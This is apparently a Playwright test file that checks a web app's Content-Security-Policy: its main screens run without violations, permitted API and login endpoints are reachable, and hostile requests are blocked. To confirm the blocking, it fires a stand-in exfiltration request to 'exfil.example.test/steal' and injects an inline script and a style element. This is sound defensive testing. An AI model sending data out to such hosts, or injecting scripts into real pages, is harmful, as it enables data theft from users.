import { expect, test, type Page } from "@playwright/test";

import { contentSecurityPolicy } from "../src/shared/config/contentSecurityPolicy";
import { collectPageErrors, expectNoPageErrors, prepareCleanPage } from "./helpers";

/**
 * Content-Security-Policy on the built app (#663).
 *
 * Runs only in the `csp-chromium` project, against `vite preview` of a production build
 * (the dev server sends no policy — React Fast Refresh needs an inline script). Every
 * `securitypolicyviolation` the page reports is collected; a screen that needs something
 * the policy forbids fails here, and so does a console error.
 */

declare global {
  interface Window {
    __cspViolations?: string[];
    __injected?: boolean;
  }
}

test.beforeEach(async ({ page }) => {
  await prepareCleanPage(page);
  await page.addInitScript(() => {
    window.__cspViolations = [];
    document.addEventListener("securitypolicyviolation", (event) => {
      window.__cspViolations?.push(`${event.effectiveDirective} ${event.blockedURI}`);
    });
  });
});

async function violations(page: Page): Promise<string[]> {
  return page.evaluate(() => window.__cspViolations ?? []);
}

/** Sentence that a CSP violation reports in Chromium's console. */
const isCspConsoleError = (text: string) => text.includes("Content Security Policy");

test("the built page carries the policy and core screens run without a violation", async ({ page }) => {
  const errors: string[] = [];
  collectPageErrors(page, errors);

  await page.goto("/");
  const meta = page.locator('meta[http-equiv="Content-Security-Policy"]');
  await expect(meta).toHaveAttribute("content", contentSecurityPolicy());

  const routes: Array<[string, RegExp | string]> = [
    ["/", /^홈$|테이블로 만드세요/],
    ["/discover", "데이터 탐색"],
    ["/refresh-jobs/new", "데이터 선택"],
    ["/refresh-jobs", /갱신 이력|Refresh History/],
    ["/workspace", "작업대"],
    ["/connections", "데이터 제공 기관 연결"],
    ["/monitoring", "시스템 모니터링"],
    ["/reports", "리포트"],
    ["/settings", "환경 설정"],
    ["/login", /로그인/],
  ];
  for (const [path, heading] of routes) {
    await page.goto(path);
    await expect(page.getByRole("heading", { name: heading }).first()).toBeVisible({ timeout: 10_000 });
    expect(await violations(page), path).toEqual([]);
  }

  // Ask KPubData's deterministic demo answer, then a report created and opened.
  await page.goto("/assistant");
  await page.getByRole("button", { name: /데모 질문/ }).first().click();
  await expect(page.getByText("이 테이블 품질 어때?").first()).toBeVisible({ timeout: 10_000 });
  await page.goto("/reports");
  const create = page.getByRole("button", { name: "Report 만들기" });
  await expect(create).toBeEnabled({ timeout: 10_000 });
  await create.click();
  await expect(page).toHaveURL(/\/reports\/[^/]+$/);
  await expect(page.getByRole("heading", { name: "Report 편집" }).first()).toBeVisible({ timeout: 10_000 });

  expect(await violations(page)).toEqual([]);
  expect(errors.filter(isCspConsoleError)).toEqual([]);
  await expectNoPageErrors(errors);
});

test("the policy admits Builder, OIDC and BYOK endpoints and blocks what it should", async ({ page }) => {
  const allowed = [
    "https://builder.example.test/version", // runtime Builder URL (config.js)
    "https://sso.example.test/realms/kpubdata/.well-known/openid-configuration", // OIDC issuer
    "https://api.openai.com/v1/models", // Ask KPubData's default BYOK base URL
    "https://llm.example.test/v1/chat/completions", // a user-entered HTTPS base URL
    "http://localhost:8080/version", // a local Builder over HTTP
  ];
  for (const url of allowed) {
    await page.route(url, (route) =>
      route.fulfill({ status: 200, contentType: "application/json", headers: { "access-control-allow-origin": "*" }, body: "{}" }),
    );
  }
  await page.goto("/");
  await expect(page.locator('meta[http-equiv="Content-Security-Policy"]')).toHaveCount(1);

  for (const url of allowed) {
    const status = await page.evaluate(async (target) => (await fetch(target)).status, url);
    expect(status, url).toBe(200);
  }
  expect(await violations(page)).toEqual([]);

  // A plain-HTTP origin other than localhost is refused before any request is made.
  const refused = await page.evaluate(async () => {
    try {
      await fetch("http://exfil.example.test/steal");
      return false;
    } catch {
      return true;
    }
  });
  expect(refused).toBe(true);

  // An injected inline script and a <style> element do not run.
  await page.evaluate(() => {
    const script = document.createElement("script");
    script.textContent = "window.__injected = true;";
    document.body.append(script);
    const style = document.createElement("style");
    style.textContent = "body { display: none; }";
    document.head.append(style);
  });
  expect(await page.evaluate(() => window.__injected ?? false)).toBe(false);
  await expect(page.locator("body")).toBeVisible();

  await expect.poll(() => violations(page)).toEqual([
    "connect-src http://exfil.example.test/steal",
    "script-src-elem inline",
    "style-src-elem inline",
  ]);
});
